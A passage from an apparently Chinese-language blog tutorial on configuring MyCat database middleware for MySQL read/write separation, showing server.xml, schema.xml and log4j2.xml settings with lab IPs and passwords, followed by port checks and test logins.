&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x68C0;&#x67E5;&#x5173;&#x8054;&#x5B57;&#x6BB5;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5206;&#x7247;&#x5B57;&#x6BB5; .&#x9ED8;&#x8BA4; false --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--  &lt;property name=&quot;useCompression&quot;&gt;1&lt;/property&gt;--&gt;</span> <span class="comment">&lt;!--1&#x4E3A;&#x5F00;&#x542F;mysql&#x538B;&#x7F29;&#x534F;&#x8BAE;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  &lt;property name=&quot;fakeMySQLVersion&quot;&gt;5.6.20&lt;/property&gt;--&gt;</span> <span class="comment">&lt;!--&#x8BBE;&#x7F6E;&#x6A21;&#x62DF;&#x7684;MySQL&#x7248;&#x672C; &#x53F7;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;property name=&quot;processorBufferChunk&quot;&gt;40960&lt;/property&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;property name=&quot;processors&quot;&gt;1&lt;/property&gt;</span></span><br><span class="line"><span class="comment">        &lt;property name=&quot;processorExecutor&quot;&gt;32&lt;/property&gt;</span></span><br><span class="line"><span class="comment">         --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x9ED8;&#x8BA4;&#x4E3A;type 0: DirectByteBufferPool | type 1 ByteBufferArena | type 2 NettyBufferPool --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;processorBufferPoolType&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x9ED8;&#x8BA4;&#x662F;65535 64K &#x7528;&#x4E8E;sql&#x89E3;&#x6790;&#x65F6;&#x6700;&#x5927;&#x6587;&#x672C;&#x957F;&#x5EA6; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;maxStringLiteralLength&quot;&gt;65535&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;sequnceHandlerType&quot;&gt;0&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;backSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;frontSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;processorExecutor&quot;&gt;16&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt;</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;idleTimeout&quot;&gt;300000&lt;/property&gt; &lt;property name=&quot;bindIp&quot;&gt;0.0.0.0&lt;/property&gt;</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;dataNodeIdleCheckPeriod&quot;&gt;300000&lt;/property&gt; 5 * 60 * 1000L; //&#x8FDE;&#x63A5;&#x7A7A;&#x95F2;&#x68C0;&#x67E5;</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;frontWriteQueueSize&quot;&gt;4096&lt;/property&gt; &lt;property name=&quot;processors&quot;&gt;32&lt;/property&gt; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5F00;&#x5173;&#xFF0C;0&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF0C;1&#x4E3A;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF08;&#x5982;&#x679C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5185; &#x53EA;&#x6D89;&#x53CA;&#x5168;&#x5C40;&#x8868;&#xFF0C;&#x5219;&#x4E0D;&#x8FC7;&#x6EE4;&#xFF09;&#xFF0C;2&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;,&#x4F46;&#x662F;&#x8BB0;&#x5F55;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;handleDistributedTransactions&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        off heap for merge/order/group/limit      1&#x5F00;&#x542F;   0&#x5173;&#x95ED;</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useOffHeapForMerge&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &#x5355;&#x4F4D;&#x4E3A;m</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;memoryPageSize&quot;</span>&gt;</span>64k<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &#x5355;&#x4F4D;&#x4E3A;k</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;spillsFileBufferSize&quot;</span>&gt;</span>1k<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useStreamOutput&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &#x5355;&#x4F4D;&#x4E3A;m</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;systemReserveMemorySize&quot;</span>&gt;</span>384m<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--&#x662F;&#x5426;&#x91C7;&#x7528;zookeeper&#x534F;&#x8C03;&#x5207;&#x6362;  --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useZKSwitch&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x8DEF;&#x5F84; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;XARecoveryLogBaseDir&quot;&gt;./&lt;/property&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x540D;&#x79F0; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;XARecoveryLogBaseName&quot;&gt;tmlog&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x5982;&#x679C;&#x4E3A; true&#x7684;&#x8BDD; &#x4E25;&#x683C;&#x9075;&#x5B88;&#x9694;&#x79BB;&#x7EA7;&#x522B;,&#x4E0D;&#x4F1A;&#x5728;&#x4EC5;&#x4EC5;&#x53EA;&#x6709;select&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x5207;&#x6362;&#x8FDE;&#x63A5;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;strictTxIsolation&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useZKSwitch&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">system</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- &#x5168;&#x5C40;SQL&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x767D;&#x540D;&#x5355;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x901A;&#x914D;&#x7B26;%&#x6216;&#x7740;*--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.0.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;1*7.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x8FD9;&#x4E9B;&#x914D;&#x7F6E;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;127.0.0.1&#x90FD;&#x80FD;&#x4EE5;root&#x8D26;&#x6237;&#x767B;&#x5F55;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;firewall&gt;</span></span><br><span class="line"><span class="comment">           &lt;whitehost&gt;</span></span><br><span class="line"><span class="comment">              &lt;host host=&quot;1*7.0.0.*&quot; user=&quot;root&quot;/&gt;</span></span><br><span class="line"><span class="comment">           &lt;/whitehost&gt;</span></span><br><span class="line"><span class="comment">       &lt;blacklist check=&quot;false&quot;&gt;</span></span><br><span class="line"><span class="comment">       &lt;/blacklist&gt;</span></span><br><span class="line"><span class="comment">        &lt;/firewall&gt;</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- fnaichu:&#x4FEE;&#x6539;&#x76F8;&#x5173;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#xFF1A; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">defaultAccount</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>ccc.456<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;schemas&quot;</span>&gt;</span>ha<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!-- &#x8868;&#x7EA7; DML &#x6743;&#x9650;&#x8BBE;&#x7F6E; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                &lt;privileges check=&quot;false&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;schema name=&quot;TESTDB&quot; dml=&quot;0110&quot; &gt;</span></span><br><span class="line"><span class="comment">                                &lt;table name=&quot;tb01&quot; dml=&quot;0000&quot;&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">                                &lt;table name=&quot;tb02&quot; dml=&quot;1111&quot;&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">                        &lt;/schema&gt;</span></span><br><span class="line"><span class="comment">                &lt;/privileges&gt;</span></span><br><span class="line"><span class="comment">                 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- fnaichu:&#x4FEE;&#x6539;&#x8FD9;&#x91CC; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>user<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;schemas&quot;</span>&gt;</span>ha<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;readOnly&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mycat:server</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4FEE;&#x6539;schema.xml</strong><br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mycat:schema</span> <span class="attr">xmlns:mycat</span>=<span class="string">&quot;http://io.mycat/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;ha&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&apos;dn1&apos;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">schema</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dn1&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;dthost&quot;</span> <span class="attr">database</span>=<span class="string">&quot;ha&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">&quot;dthost&quot;</span> <span class="attr">maxCon</span>=<span class="string">&quot;500&quot;</span> <span class="attr">minCon</span>=<span class="string">&quot;10&quot;</span> <span class="attr">balance</span>=<span class="string">&quot;3&quot;</span> <span class="attr">writeType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">dbType</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbDriver</span>=<span class="string">&quot;native&quot;</span> <span class="attr">switchType</span>=<span class="string">&quot;1&quot;</span> <span class="attr">slaveThreshold</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">&quot;rhel7&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.73.21:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;ccc.456&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">readHost</span> <span class="attr">host</span>=<span class="string">&quot;rhel_sqlsrv&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.73.22:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;ccc.456&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">writeHost</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mycat:schema</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4FEE;&#x6539;log4j2.xml&#x6587;&#x4EF6;</strong><br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d [%-5p][%t] %m %throwable{full} (%C:%F:%L) %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;RollingFile&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;${sys:MYCAT_HOME}/logs/mycat.log&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">filePattern</span>=<span class="string">&quot;${sys:MYCAT_HOME}/logs/$${date:yyyy-MM}/mycat-%d{MM-dd}-%i.log.gz&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>%d{yyyy-MM-dd HH:mm:ss.SSS} %5p [%t] (%l) - %m%n<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">OnStartupTriggeringPolicy</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">SizeBasedTriggeringPolicy</span> <span class="attr">size</span>=<span class="string">&quot;250 MB&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;AsyncLogger name=&quot;io.mycat&quot; level=&quot;info&quot; includeLocation=&quot;true&quot; additivity=&quot;false&quot;&gt;--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;AppenderRef ref=&quot;Console&quot;/&gt;--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--&lt;AppenderRef ref=&quot;RollingFile&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;/AsyncLogger&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- fnaichu:&#x8C03;&#x6574;&#x65E5;&#x5FD7;&#x7EA7;&#x522B; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asyncRoot</span> <span class="attr">level</span>=<span class="string">&quot;debug&quot;</span> <span class="attr">includeLocation</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--&lt;AppenderRef ref=&quot;Console&quot; /&gt;--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;RollingFile&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">asyncRoot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;"><a href="#&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;"></a>&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;</h2><p>&#x76EE;&#x524D;MyCAT&#x6709;&#x4E24;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;8066&#x6570;&#x636E;&#x7AEF;&#x53E3;&#xFF0C;9066&#x7BA1;&#x7406;&#x7AEF;&#x53E3;&#xFF0C;&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x7528;8066&#x6570;&#x636E;&#x7AEF;&#x53E3;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; netstat -pantul | grep 66</span><br><span class="line">tcp6       0      0 :::46667                :::*                    LISTEN      4136/java</span><br><span class="line"></span><br><span class="line">tcp6       0      0 :::8066                 :::*                    LISTEN      4136/java</span><br><span class="line"></span><br><span class="line">tcp6       0      0 :::9066                 :::*                    LISTEN      4136/java</span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]#</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]<span class="comment"># mysql -uroot -pccc.456 -h192.168.73.20 -P8066</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.6.29-mycat-1.6.7.3-<span class="keyword">release</span><span class="number">-20190927161129</span> MyCat <span class="keyword">Server</span> (OpenCloudDB)</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2018</span>, <span class="keyword">Oracle</span> <span class="keyword">and</span>/<span class="keyword">or</span> its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Oracle</span> <span class="keyword">is</span> a registered trademark <span class="keyword">of</span> <span class="keyword">Oracle</span> Corporation <span class="keyword">and</span>/<span class="keyword">or</span> its</span><br><span class="line">affiliates. Other <span class="keyword">names</span> may be trademarks <span class="keyword">of</span> their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Type</span> <span class="string">&apos;help;&apos;</span> <span class="keyword">or</span> <span class="string">&apos;\h&apos;</span> <span class="keyword">for</span> help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| DATABASE |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| ha       |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]<span class="comment"># mysql -uroot -pccc.456 -h192.168.73.20 -P9066</span></span><br><span class="line">mysql: [<span class="keyword">Warning</span>] <span class="keyword">Using</span> a <span class="keyword">password</span> <span class="keyword">on</span> the command line <span class="keyword">interface</span> can be insecure.</span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.6.29-mycat-1.6.7.3-<span class="keyword">release</span><span class="number">-20190927161129</span> MyCat <span class="keyword">Server</span> (monitor)</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2018</span>, <span class="keyword">Oracle</span> <span class="keyword">and</span>/<span class="keyword">or</span> its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Oracle</span> <span class="keyword">is</span> a registered trademark <span class="keyword">of</span> <span class="keyword">Oracle</span> Corporation <span class="keyword">and</span>/<span class="keyword">or</span> its</span><br><span class="line">affiliates. Other <span class="keyword">names</span> may be trademarks <span class="keyword">of</span> their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Type</span> <span class="string">&apos;help;&apos;</span> <span class="keyword">or</span> <span class="string">&apos;\h&apos;</span> <span class="keyword">for</span> help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| DATABASE |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| ha       |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x89C2;&#x5BDF;&#x65E5;&#x5FD7;&#x53D8;&#x5316;</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /usr/local/mycat/logs/mycat.log</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 